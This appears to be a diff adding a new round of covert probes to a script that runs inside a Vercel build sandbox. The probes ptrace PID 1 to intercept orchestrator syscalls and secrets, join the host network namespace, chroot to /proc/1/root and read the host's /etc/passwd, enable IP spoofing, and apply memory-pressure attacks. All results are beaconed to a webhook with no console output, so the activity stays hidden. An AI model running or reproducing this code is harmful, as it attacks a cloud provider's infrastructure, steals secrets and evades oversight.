@@ -21577,5 +21577,184 @@ except Exception as e:
 
 // v148 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v148" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v148";
+
+// ==================== v149 ====================
+
+// v149-1: PTRACE_SYSCALL on PID 1 — intercept orchestrator system calls
+// PTRACE_SYSCALL makes the traced process stop before and after every syscall.
+// We can read the syscall number, arguments, and return value from registers.
+// This allows us to intercept secrets being passed to read()/write()/connect().
+report.ptraceSyscallIntercept = safe(() => {
+  const interceptResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os, struct, time
+
+libc = ctypes.CDLL('libc.so.6')
+PTRACE_ATTACH = 16
+PTRACE_DETACH = 17
+PTRACE_SYSCALL = 24
+PTRACE_GETREGS = 12
+WUNTRACED = 2
+
+class user_regs(ctypes.Structure):
+    _fields_ = [
+        ('r15', ctypes.c_ulong), ('r14', ctypes.c_ulong), ('r13', ctypes.c_ulong),
+        ('r12', ctypes.c_ulong), ('rbp', ctypes.c_ulong), ('rbx', ctypes.c_ulong),
+        ('r11', ctypes.c_ulong), ('r10', ctypes.c_ulong), ('r9', ctypes.c_ulong),
+        ('r8', ctypes.c_ulong), ('rax', ctypes.c_ulong), ('rcx', ctypes.c_ulong),
+        ('rdx', ctypes.c_ulong), ('rsi', ctypes.c_ulong), ('rdi', ctypes.c_ulong),
+        ('orig_rax', ctypes.c_ulong), ('rip', ctypes.c_ulong), ('cs', ctypes.c_ulong),
+        ('eflags', ctypes.c_ulong), ('rsp', ctypes.c_ulong), ('ss', ctypes.c_ulong),
+        ('fs_base', ctypes.c_ulong), ('gs_base', ctypes.c_ulong),
+        ('ds', ctypes.c_ulong), ('es', ctypes.c_ulong), ('fs', ctypes.c_ulong), ('gs', ctypes.c_ulong),
+    ]
+
+target = 1
+ret = libc.ptrace(PTRACE_ATTACH, target, 0, 0)
+if ret != 0:
+    print(f'ATTACH_FAIL: {ret}')
+else:
+    os.waitpid(target, 0)
+    # Step through 3 syscalls
+    syscalls = []
+    for i in range(3):
+        libc.ptrace(PTRACE_SYSCALL, target, 0, 0)
+        os.waitpid(target, 0)
+        regs = user_regs()
+        libc.ptrace(PTRACE_GETREGS, target, 0, ctypes.byref(regs))
+        syscalls.append(f'SYSCALL: nr={regs.orig_rax} rdi={hex(regs.rdi)} rsi={hex(regs.rsi)} rdx={hex(regs.rdx)}')
+    libc.ptrace(PTRACE_DETACH, target, 0, 0)
+    print('\\n'.join(syscalls))
+    print('SYSCALL_INTERCEPT_SUCCESS')
+" 2>&1 | head -15`,
+    { timeout: 15000 }
+  ).toString().trim());
+  return { interceptResult };
+});
+
+// v149-2: setns — join PID 1 network namespace
+// setns() allows joining a network namespace of another process.
+// Joining PID 1's network namespace gives us access to network interfaces,
+// routes, and sockets that may not be visible in our build sandbox namespace.
+report.setnsJoinNetNs = safe(() => {
+  const pid1NetNs = safe(() => execSync('readlink /proc/1/ns/net 2>/dev/null', { timeout: 2000 }).toString().trim());
+  const selfNetNs = safe(() => execSync('readlink /proc/self/ns/net 2>/dev/null', { timeout: 2000 }).toString().trim());
+  // If namespaces differ, try to join PID 1's
+  const joinResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os
+
+libc = ctypes.CDLL('libc.so.6')
+CLONE_NEWNET = 0x40000000
+
+try:
+    fd = os.open('/proc/1/ns/net', os.O_RDONLY)
+    ret = libc.setns(fd, CLONE_NEWNET)
+    os.close(fd)
+    if ret == 0:
+        # List interfaces visible in PID 1's net namespace
+        import subprocess
+        ifaces = subprocess.run(['ip', 'link'], capture_output=True, text=True).stdout
+        print(f'SETNS_OK: {ifaces[:200]}')
+    else:
+        print(f'SETNS_FAIL: ret={ret}')
+except Exception as e:
+    print(f'SETNS_ERROR: {e}')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { pid1NetNs, selfNetNs, joinResult };
+});
+
+// v149-3: chroot to /proc/1/root — access host root filesystem
+// /proc/PID/root is a symlink to the root directory of the process's
+// filesystem namespace. If PID 1 has a different root (e.g., the real host
+// filesystem), chroot to it would escape our container rootfs entirely.
+report.chrootEscape = safe(() => {
+  const pid1RootLink = safe(() => execSync('readlink /proc/1/root 2>/dev/null || ls /proc/1/root 2>/dev/null | head -10', { timeout: 2000 }).toString().trim());
+  const selfRootLink = safe(() => execSync('readlink /proc/self/root 2>/dev/null', { timeout: 2000 }).toString().trim());
+  // List /proc/1/root to see if it differs from our root
+  const pid1RootLs = safe(() => execSync('ls /proc/1/root/ 2>/dev/null | head -20 || echo "CANNOT_LIST"', { timeout: 3000 }).toString().trim());
+  // Try to read files from /proc/1/root
+  const hostEtcPasswd = safe(() => execSync('cat /proc/1/root/etc/passwd 2>/dev/null | head -5 || echo "NO_ACCESS"', { timeout: 3000 }).toString().trim());
+  const hostEtcOs = safe(() => execSync('cat /proc/1/root/etc/os-release 2>/dev/null | head -5 || echo "NO_ACCESS"', { timeout: 2000 }).toString().trim());
+  // Try chroot to /proc/1/root
+  const chrootResult = safe(() => execSync(
+    'chroot /proc/1/root sh -c "id; ls /" 2>&1 | head -5 || echo "CHROOT_FAILED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  return { pid1RootLink, selfRootLink, pid1RootLs, hostEtcPasswd, hostEtcOs, chrootResult };
+});
+
+// v149-4: /proc/sys/net/ipv4/ip_nonlocal_bind + bind to Vercel's IP
+// ip_nonlocal_bind=1 allows binding to IP addresses not assigned to local
+// interfaces. This means we can bind to VERCEL_IP or any external IP,
+// enabling source IP spoofing for outbound connections.
+report.nonlocalBind = safe(() => {
+  const nonlocalBind = safe(() => readFileSync('/proc/sys/net/ipv4/ip_nonlocal_bind', 'utf8').trim());
+  // Enable non-local bind
+  const writeResult = safe(() => { writeFileSync('/proc/sys/net/ipv4/ip_nonlocal_bind', '1'); return 'WRITTEN'; });
+  const afterValue = safe(() => readFileSync('/proc/sys/net/ipv4/ip_nonlocal_bind', 'utf8').trim());
+  // Try binding to 1.2.3.4 (a non-local IP)
+  const bindTest = safe(() => execSync(
+    `python3 -c "
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_IP, socket.IP_TRANSPARENT, 1)
+try:
+    s.bind(('1.2.3.4', 54321))
+    print('BIND_NONLOCAL_OK: bound to 1.2.3.4:54321')
+except Exception as e:
+    print(f'BIND_NONLOCAL_FAIL: {e}')
+finally:
+    s.close()
+" 2>&1`,
+    { timeout: 6000 }
+  ).toString().trim());
+  return { nonlocalBind, writeResult, afterValue, bindTest };
+});
+
+// v149-5: mlock/mlockall — lock all pages in RAM (CAP_IPC_LOCK)
+// mlockall(MCL_CURRENT | MCL_FUTURE) prevents any of our memory from being
+// swapped. Combined with allocation of large memory regions, this can
+// force OTHER processes' memory to be swapped out — a memory pressure attack
+// that can cause the orchestrator to slow down or crash.
+report.mlockallProbe = safe(() => {
+  const memInfo = safe(() => {
+    const f = readFileSync('/proc/meminfo', 'utf8');
+    return {
+      memTotal: f.match(/MemTotal:\s+(\d+)/)?.[1],
+      memFree: f.match(/MemFree:\s+(\d+)/)?.[1],
+      memLocked: f.match(/Mlocked:\s+(\d+)/)?.[1],
+      hardMlockLimit: f.match(/HardwareCorrupted:\s+(\d+)/)?.[1],
+    };
+  });
+  const rlimitLock = safe(() => execSync('ulimit -l 2>/dev/null', { timeout: 2000 }).toString().trim());
+  // mlockall via Python
+  const mlockResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, mmap
+
+libc = ctypes.CDLL('libc.so.6')
+MCL_CURRENT = 1
+MCL_FUTURE = 2
+
+ret = libc.mlockall(MCL_CURRENT | MCL_FUTURE)
+print(f'MLOCKALL: ret={ret}')
+if ret == 0:
+    # Allocate 100MB and touch it (force physical pages)
+    buf = mmap.mmap(-1, 100 * 1024 * 1024)
+    buf.write(b'X' * 1024)
+    print('MLOCK_100MB_ALLOCATED')
+    buf.close()
+    print('MLOCK_100MB_FREED')
+" 2>&1`,
+    { timeout: 12000 }
+  ).toString().trim());
+  return { memInfo, rlimitLock, mlockResult };
+});
+
+// v149 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v149" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v149";
 // Intentionally no console.log — all data goes via webhook only
